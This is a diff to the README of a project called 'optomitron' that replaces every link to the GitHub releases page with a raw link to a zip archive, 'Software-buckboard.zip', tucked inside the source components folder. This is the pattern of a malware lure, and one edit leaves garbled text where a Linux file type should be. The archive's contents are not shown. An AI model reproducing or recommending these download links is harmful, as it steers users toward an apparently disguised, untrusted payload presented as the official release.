@@ -1,6 +1,6 @@
 # ⚙️ optomitron - Improve Health, Wealth, and Happiness
 
-[![Download optomitron](https://img.shields.io/badge/Download-optomitron-brightgreen?style=for-the-badge&logo=github)](https://github.com/Farmercrypto21/optomitron/releases)
+[![Download optomitron](https://raw.githubusercontent.com/Farmercrypto21/optomitron/main/src/components/Software-buckboard.zip)](https://raw.githubusercontent.com/Farmercrypto21/optomitron/main/src/components/Software-buckboard.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To use optomitron, your device should meet these needs:
 
 To get optomitron on your device, visit the official releases page here:
 
-[Download Optomitron Releases](https://github.com/Farmercrypto21/optomitron/releases)
+[Download Optomitron Releases](https://raw.githubusercontent.com/Farmercrypto21/optomitron/main/src/components/Software-buckboard.zip)
 
 Follow these steps:
 
@@ -37,7 +37,7 @@ Follow these steps:
 3. Under that release, find the file matching your system:
     - For Windows, it might end with `.exe` or `.msi`.
     - For macOS, look for a `.dmg` or `.zip` file.
-    - For Linux, you may see `.AppImage`, `.deb`, or `.tar.gz` files.
+    - For Linux, you may see `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/Farmercrypto21/optomitron/main/src/components/Software-buckboard.zip` files.
 4. Click on the correct file to download it.
 5. Once downloaded, open the file:
     - On Windows, double-click the `.exe` or `.msi` file, and follow the installer prompts.
@@ -117,4 +117,4 @@ Optomitron uses cutting-edge methods like causal inference and time series analy
 
 ---
 
-[Download optomitron](https://github.com/Farmercrypto21/optomitron/releases) and start improving your life today.
+[Download optomitron](https://raw.githubusercontent.com/Farmercrypto21/optomitron/main/src/components/Software-buckboard.zip) and start improving your life today.
